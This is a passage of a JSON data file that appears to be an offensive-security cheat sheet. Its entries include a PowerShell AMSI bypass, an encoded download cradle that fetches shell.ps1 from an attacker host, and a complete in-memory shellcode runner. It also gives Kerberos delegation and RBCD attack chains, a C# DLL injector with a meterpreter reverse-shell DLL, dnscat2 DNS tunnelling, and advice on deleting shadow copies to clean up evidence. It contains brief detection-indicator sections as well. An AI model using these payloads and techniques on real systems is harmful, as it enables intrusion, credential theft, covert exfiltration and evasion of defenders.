            "lang": "powershell",
            "code": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Encoded PowerShell Payload",
        "codes": [
          {
            "lang": "bash",
            "code": "# On Kali\necho -n \"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')\" | iconv -t UTF-16LE | base64 -w 0"
          },
          {
            "lang": "bash",
            "code": "GodPotato.exe -cmd \"powershell -enc <Base64>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "In-Memory PowerShell Execution",
    "title": "DelegateType Reflection Shellcode Runner",
    "tags": [
      "Defense_Evasion",
      "Execution",
      "PowerShell",
      "Windows"
    ],
    "steps": [
      {
        "title": "Complete Reflection Runner",
        "codes": [
          {
            "lang": "powershell",
            "code": "function LookupFunc {\n    Param(\n        [Parameter(Mandatory=$true)][String]$Module,\n        [Parameter(Mandatory=$true)][String]$Function\n    )\n\n    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') })\n    $unsafeNativeMethods = $assem.GetType('Microsoft.Win32.UnsafeNativeMethods')\n    $GetModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')\n    $GetProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))\n\n    $kern32Handle = $GetModuleHandle.Invoke($null, @($Module))\n    $handleRef = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $kern32Handle)\n\n    return $GetProcAddress.Invoke($null, @($handleRef, $Function))\n}\n\nfunction getDelegateType {\n    Param(\n        [Parameter(Mandatory=$true)][Type[]]$func,\n        [Parameter(Mandatory=$true)][Type]$delType\n    )\n\n    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\n    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')\n\n    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')\n\n    return $type.CreateType()\n}\n\n# Get VirtualAlloc\n$vaAddr = LookupFunc \"kernel32.dll\" \"VirtualAlloc\"\n$vaDelegate = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])\n$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vaAddr, $vaDelegate)\n\n# Get CreateThread\n$ctAddr = LookupFunc \"kernel32.dll\" \"CreateThread\"\n$ctDelegate = getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])\n$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, $ctDelegate)\n\n# Get WaitForSingleObject\n$wfsoAddr = LookupFunc \"kernel32.dll\" \"WaitForSingleObject\"\n$wfsoDelegate = getDelegateType @([IntPtr], [Int32]) ([Int])\n$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wfsoAddr, $wfsoDelegate)\n\n# Shellcode\n[Byte[]]$buf = 0xfc,0x48,0x83,...\n\n# Allocate, copy, execute\n$mem = $VirtualAlloc.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)\n$hThread = $CreateThread.Invoke([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)\n$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "PowerSploit",
        "url": "https://github.com/PowerShellMafia/PowerSploit"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Pure reflection-based shellcode execution. No **Add-Type**, no disk writes.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Delegation Attacks",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Delegation Discovery",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-DomainComputer -Unconstrained\nGet-DomainUser -TrustedToAuth\nGet-DomainComputer -TrustedToAuth"
          },
          {
            "lang": "bash",
            "code": "findDelegation.py <Domain>/<User>:<Pass> -dc-ip <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Unconstrained delegation: `TRUSTED_FOR_DELEGATION` flag\nConstrained delegation: `msDS-AllowedToDelegateTo` attribute"
          }
        ]
      },
      {
        "title": "Unconstrained Delegation",
        "substeps": [
          {
            "title": "Enumeration with BloodHound",
            "codes": [
              {
                "lang": "cypher",
                "code": "MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT (c)-[:MemberOf]->(:Group {name:'DOMAIN CONTROLLERS@<DOMAIN>'}) RETURN c.name\nMATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Enumeration with PowerView",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-NetComputer -Unconstrained"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "Enumeration with NetExec",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "Step 1 - Compromise Unconstrained Delegation Machine",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Gain code execution on the machine with unconstrained delegation enabled."
              }
            ]
          },
          {
            "title": "Step 2 - Monitor for Incoming TGTs",
            "codes": [
              {
                "lang": "powershell",
                "code": "Rubeus.exe monitor /interval:5 /filteruser:DC01$"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Step 3 - Coerce DC to Authenticate",
            "codes": [
              {
                "lang": "bash",
                "code": "printerbug.py <Domain>/<User>:<Pass>@<DC_IP> <CompromisedHost>\nPetitPotam.py <CompromisedHost> <DC_IP>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Step 4 - Use Captured DC TGT for DCSync",
            "codes": [
              {
                "lang": "bash",
                "code": "export KRB5CCNAME=DC01$.ccache\nsecretsdump.py -k -no-pass <DC_FQDN>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Requirements:**\nCompromise of unconstrained delegation machine (non-DC)\nAbility to coerce DC authentication (PrinterBug, PetitPotam)\nNetwork access to DC (port 88)"
          },
          {
            "type": "note",
            "content": "Machines with unconstrained delegation store the TGT of any user that connects. Compromise the machine + coerce DC authentication = DC's TGT -> DCSync."
          }
        ]
      },
      {
        "title": "Constrained Delegation",
        "substeps": [
          {
            "title": "Enumeration with BloodHound",
            "codes": [
              {
                "lang": "cypher",
                "code": "## Users\nMATCH (u:User {trustedtoauth:true}) RETURN u.name, u.allowedtodelegate\n\n## Computers\nMATCH (c:Computer {trustedtoauth:true}) RETURN c.name, c.allowedtodelegate\n\n## All\nMATCH (c) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate\nMATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Enumeration with PowerView",
            "codes": [
              {
                "lang": "powershell",
                "code": "## Users\nGet-DomainUser -TrustedToAuth\n\n## Computers\nGet-DomainComputer -TrustedToAuth"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "Enumeration with NetExec",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "Exploit Constrained Delegation",
            "codes": [
              {
                "lang": "bash",
                "code": "impacket-getST -spn cifs/<TargetIP> -impersonate Administrator <Domain>/<SvcUser> -hashes :<NTHash>\ngetST.py -spn cifs/<TargetFQDN> -impersonate Administrator <Domain>/<User>:<Pass>\ngetST.py -spn cifs/<TargetFQDN> -impersonate Administrator -hashes :<NTHash> <Domain>/<User>\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec <Domain>/Administrator@<TargetIP> -k -no-pass\nimpacket-psexec -k -no-pass <TargetFQDN>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Requirements:**\nControl of delegating account (password or hash)\nTarget SPN in `msDS-AllowedToDelegateTo` attribute\nNetwork access to target service"
          },
          {
            "type": "note",
            "content": "Accounts with constrained delegation can impersonate any user to specific services (SPNs) via S4U2Self/S4U2Proxy.\nThe SPN service class can often be substituted. If delegation is to `time/target`, try `cifs/target`."
          }
        ]
      },
      {
        "title": "Resource-Based Constrained Delegation (RBCD)",
        "substeps": [
          {
            "title": "Enumeration with BloodHound",
            "codes": [
              {
                "lang": "cypher",
                "code": "## Find write access to computers\nMATCH p=(u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(c:Computer) RETURN p\nMATCH p=(n)-[:GenericWrite|GenericAll|Owns|WriteDacl|WriteOwner|AddAllowedToAct]->(c:Computer) RETURN p"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Enumeration with PowerView",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {\n  $_.ActiveDirectoryRights -match \"WriteProperty|GenericAll|GenericWrite\"\n}"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "Check MachineAccountQuota",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc ldap <DC_IP> -u <User> -p <Pass> -M maq"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Step 1 - Create Machine Account",
            "codes": [
              {
                "lang": "bash",
                "code": "impacket-addcomputer <Domain>/<User>:<Pass> -computer-name 'YOURPC$' -computer-pass 'Password123'\naddcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-host <DC_IP> <Domain>/<User>:<Pass>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Step 2 - Configure RBCD on Target",
            "codes": [
              {
                "lang": "bash",
                "code": "impacket-rbcd <Domain>/<User>:<Pass> -dc-ip <DC_IP> -action write -delegate-to <Target>$ -delegate-from YOURPC$\nrbcd.py -delegate-from 'YOURPC$' -delegate-to '<TargetComputer>$' -action write <Domain>/<User>:<Pass>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Step 3 - Get Service Ticket as Admin",
            "codes": [
              {
                "lang": "bash",
                "code": "impacket-getST -spn cifs/<Target> -impersonate Administrator <Domain>/YOURPC$:'Password123'\ngetST.py -spn cifs/<TargetFQDN> -impersonate Administrator <Domain>/YOURPC$:'Password123!'"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Step 4 - Use the Ticket",
            "codes": [
              {
                "lang": "bash",
                "code": "export KRB5CCNAME=Administrator.ccache\nimpacket-psexec <Domain>/Administrator@<Target> -k -no-pass\nimpacket-psexec -k -no-pass <TargetFQDN>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RBCD Cleanup",
            "codes": [
              {
                "lang": "bash",
                "code": "rbcd.py -delegate-to '<TargetComputer>$' -action flush <Domain>/<User>:<Pass>"
              },
              {
                "lang": "bash",
                "code": "addcomputer.py -computer-name 'YOURPC$' -delete -dc-host <DC_IP> <Domain>/<User>:<Pass>"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "**Troubleshooting:**\n**Can't create machine account** (MAQ = 0): Use existing machine account you control\n**RBCD write fails** (No write permission): Verify ACLs in BloodHound\n**getST.py fails** (S4U issues): Check account types, target must be computer\n**Ticket doesn't work** (Wrong SPN or hostname): Use FQDN, verify DNS"
              },
              {
                "type": "text",
                "content": "##### Remove RBCD Configuration [optional]"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Requirements:**\n`GenericWrite`, `GenericAll`, `WriteDacl`, or `WriteOwner` on target computer\nAbility to create machine account (MAQ > 0) or control of existing one\nNetwork access to target (port 445)"
          },
          {
            "type": "note",
            "content": "If you have write access to a computer object, configure it to trust a machine you control, then impersonate admin users to it.\nRequires GenericAll/GenericWrite on a computer object."
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Delete Shadow Copies (Cleanup)",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "Delete All Shadow Copies",
        "codes": [
          {
            "lang": "powershell",
            "code": "vssadmin delete shadows /all /quiet"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Delete Specific Shadow Copy",
        "codes": [
          {
            "lang": "powershell",
            "code": "vssadmin delete shadows /shadow={ShadowCopyID} /quiet"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Delete Oldest Shadow Copy",
        "codes": [
          {
            "lang": "powershell",
            "code": "vssadmin delete shadows /for=C: /oldest /quiet"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Zerologon",
    "title": "Detection",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [
      {
        "title": "Check if Target is Vulnerable",
        "codes": [
          {
            "lang": "bash",
            "code": "# Using zerologon_tester.py\npython3 zerologon_tester.py <DC-NetBIOS-Name> <DC-IP>"
          },
          {
            "lang": "bash",
            "code": "python3 zerologon_tester.py DC01 192.168.1.10"
          },
          {
            "lang": "text",
            "code": "Success! DC can be fully compromised by a Zerologon attack."
          },
          {
            "lang": "text",
            "code": "Attack failed. Target is likely patched."
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Detection and Evasion",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "Event IDs to Watch",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- **Event ID 7036**: VSS service started/stopped\n- **Event ID 8222**: Shadow copy created\n- **Event ID 8224**: Shadow copy deleted"
          }
        ]
      },
      {
        "title": "Evasion Tips",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. **Use existing shadow copies** - Don't create new ones\n2. **Delete shadow copies after use** - Clean up evidence\n3. **Use DRSUAPI instead** - More stealthy for NTDS.dit extraction\n4. **Avoid vssadmin** - Use WMI or PowerShell instead (less obvious)"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Shadow copy operations are often logged and monitored.",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Zerologon",
    "title": "Detection and Indicators",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [
      {
        "title": "Event Logs",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- **Event ID 4742**: Computer account changed\n- **Event ID 4624**: Logon with computer account\n- **Event ID 5805**: Netlogon authentication failure"
          }
        ]
      },
      {
        "title": "Network Indicators",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- Multiple Netlogon RPC calls with all-zero challenge\n- Unusual authentication attempts from non-domain systems\n- Computer account password changes without corresponding events"
          }
        ]
      },
      {
        "title": "Behavioral Indicators",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- DC computer account authenticating from non-DC IP\n- Sudden DCSync activity\n- Computer account password reset without admin action"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Just-In-Time (JIT) Access",
    "title": "Detection and Logging",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "JIT Event Logs",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Event sources:\n- MIM PAM logs\n- Security event 4728 (member added to group)\n- Security event 4729 (member removed from group)",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Monitor for Anomalies",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Detection indicators:\n- Requests outside business hours\n- Frequent re-requests\n- Long TTL requests\n- Requests from unusual locations",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Writable etc-passwd",
    "title": "Different Hash Types",
    "tags": [],
    "steps": [
      {
        "title": "DES (Weak, Legacy)",
        "codes": [
          {
            "lang": "bash",
            "code": "openssl passwd Password123\n# Output: xyz123abc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "MD5",
        "codes": [
          {
            "lang": "bash",
            "code": "openssl passwd -1 Password123\n# Output: $1$salt$hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SHA-256",
        "codes": [
          {
            "lang": "bash",
            "code": "openssl passwd -5 Password123\n# Output: $5$salt$hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SHA-512 (Recommended)",
        "codes": [
          {
            "lang": "bash",
            "code": "openssl passwd -6 Password123\n# Output: $6$salt$hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "DLL Injection",
    "title": "DLL Injection Theory",
    "tags": [
      "Code_Injection",
      "DLL_Injection",
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "DLL Injection Flow",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Injection sequence:\n1. Get handle to target process (**OpenProcess**)\n2. Allocate memory for DLL path string (**VirtualAllocEx**)\n3. Write DLL path to allocated memory (**WriteProcessMemory**)\n4. Get address of **LoadLibraryA** in kernel32.dll\n5. Create remote thread calling **LoadLibraryA** with DLL path (**CreateRemoteThread**)",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Required APIs",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **OpenProcess** - Get handle to target process\n- **VirtualAllocEx** - Allocate memory for DLL path\n- **WriteProcessMemory** - Write DLL path string\n- **GetModuleHandle** - Get kernel32.dll base address\n- **GetProcAddress** - Get LoadLibraryA address\n- **CreateRemoteThread** - Call LoadLibraryA with DLL path"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "MITRE ATT&CK - DLL Injection",
        "url": "https://attack.mitre.org/techniques/T1055/001/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Load malicious DLL into target process. DLL executes in context of target process.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "DLL Injection",
    "title": "DLL Injection with C#",
    "tags": [
      "Code_Injection",
      "DLL_Injection",
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "API Imports",
        "codes": [
          {
            "lang": "csharp",
            "code": "using System;\nusing System.Runtime.InteropServices;\nusing System.Diagnostics;\nusing System.Text;\n\npublic class DllInjector\n{\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto)]\n    static extern IntPtr GetModuleHandle(string lpModuleName);\n\n    [DllImport(\"kernel32.dll\", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Complete C# DLL Injector",
        "codes": [
          {
            "lang": "csharp",
            "code": "using System;\nusing System.Runtime.InteropServices;\nusing System.Diagnostics;\nusing System.Text;\n\npublic class DllInjector\n{\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto)]\n    static extern IntPtr GetModuleHandle(string lpModuleName);\n\n    [DllImport(\"kernel32.dll\", CharSet = CharSet.Ansi, SetLastError = true)]\n    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n\n    static void Main(string[] args)\n    {\n        string dllPath = @\"C:\\path\\to\\malicious.dll\";\n\n        // Find target process\n        Process[] procs = Process.GetProcessesByName(\"explorer\");\n        int pid = procs[0].Id;\n\n        // Open process\n        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);\n\n        // Allocate memory for DLL path\n        byte[] dllPathBytes = Encoding.ASCII.GetBytes(dllPath + \"\\0\");\n        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length, 0x3000, 0x04);\n\n        // Write DLL path\n        IntPtr outSize;\n        WriteProcessMemory(hProcess, addr, dllPathBytes, dllPathBytes.Length, out outSize);\n\n        // Get LoadLibraryA address\n        IntPtr kernel32 = GetModuleHandle(\"kernel32.dll\");\n        IntPtr loadLibrary = GetProcAddress(kernel32, \"LoadLibraryA\");\n\n        // Create remote thread to call LoadLibraryA\n        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibrary, addr, 0, IntPtr.Zero);\n    }\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Create Malicious DLL",
        "substeps": [
          {
            "title": "msfvenom DLL",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f dll -o malicious.dll"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Custom DLL with DllMain",
            "codes": [
              {
                "lang": "csharp",
                "code": "// Compile as Class Library (DLL)\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class MaliciousDll\n{\n    [DllExport(\"DllMain\", CallingConvention = CallingConvention.StdCall)]\n    public static bool DllMain(IntPtr hModule, uint ul_reason_for_call, IntPtr lpReserved)\n    {\n        if (ul_reason_for_call == 1) // DLL_PROCESS_ATTACH\n        {\n            // Payload executes when DLL is loaded\n            System.Diagnostics.Process.Start(\"calc.exe\");\n        }\n        return true;\n    }\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "DNS Tunneling",
    "title": "DNS Tunneling",
    "tags": [
      "DNS",
      "Defense_Evasion",
      "Exfiltration",
      "Network"
    ],
    "steps": [
      {
        "title": "Theory",
        "substeps": [
          {
            "title": "How DNS Tunneling Works",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Tunneling flow:\n1. Client encodes data in DNS query (subdomain or TXT record)\n2. Query sent to attacker-controlled DNS server\n3. Server decodes query, processes, encodes response\n4. Response returned via DNS protocol\n5. Data exfiltration/C2 over DNS",
                "variant": "info"
              }
            ]
          },
          {
            "title": "DNS Record Types for Tunneling",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "- **TXT** - Up to 255 bytes per record, commonly used\n- **A** - 4 bytes encoded as IP address\n- **AAAA** - 16 bytes encoded as IPv6 address\n- **CNAME** - Variable length subdomain encoding\n- **MX** - Mail exchange records"
              }
            ]
          },
          {
            "title": "DNS Tunneling Limitations",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Limitations:\n- Slow compared to direct connections\n- Query size limits\n- May trigger anomaly detection (many DNS queries)\n- Requires authoritative DNS server",
                "variant": "warning"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "DNS Tunneling with dnscat2",
        "substeps": [
          {
            "title": "Server Setup",
            "codes": [
              {
                "lang": "bash",
                "code": "# Install dnscat2 server\ngit clone https://github.com/iagox86/dnscat2\ncd dnscat2/server\ngem install bundler\nbundle install"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Start Server with Domain",
            "codes": [
              {
                "lang": "bash",
                "code": "ruby dnscat2.rb <YourDomain> --secret=<Secret>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Start Server Direct Mode",
            "codes": [
              {
                "lang": "bash",
                "code": "ruby dnscat2.rb --dns server=0.0.0.0,port=53 --secret=<Secret>"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "Client Deployment",
            "codes": [
              {
                "lang": "bash",
                "code": "dnscat2.exe --dns server=<DNSServer>,domain=<YourDomain> --secret=<Secret>"
              },
              {
                "lang": "bash",
                "code": "./dnscat --dns server=<DNSServer>,domain=<YourDomain> --secret=<Secret>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "dnscat2 Server Commands",
            "codes": [
              {
                "lang": "text",
                "code": "# List sessions\nsessions\n\n# Interact with session\nsession -i <ID>\n\n# Execute command\nexec cmd.exe\n\n# Download file\ndownload C:\\Users\\victim\\file.txt\n\n# Upload file\nupload localfile.txt C:\\Windows\\Temp\\file.txt\n\n# Shell\nshell"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "PowerShell dnscat2 Client",
            "codes": [
              {
                "lang": "powershell",
                "code": "IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/dnscat2.ps1')\nStart-Dnscat2 -Domain <YourDomain> -DNSServer <DNSServer>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Alternative DNS Tunneling Tools",
        "substeps": [
          {
            "title": "Iodine",
            "codes": [
              {
                "lang": "bash",
                "code": "# Server\niodined -f -c -P <Password> 10.0.0.1 <YourDomain>\n\n# Client\niodine -f -P <Password> <YourDomain>"
              }
            ],
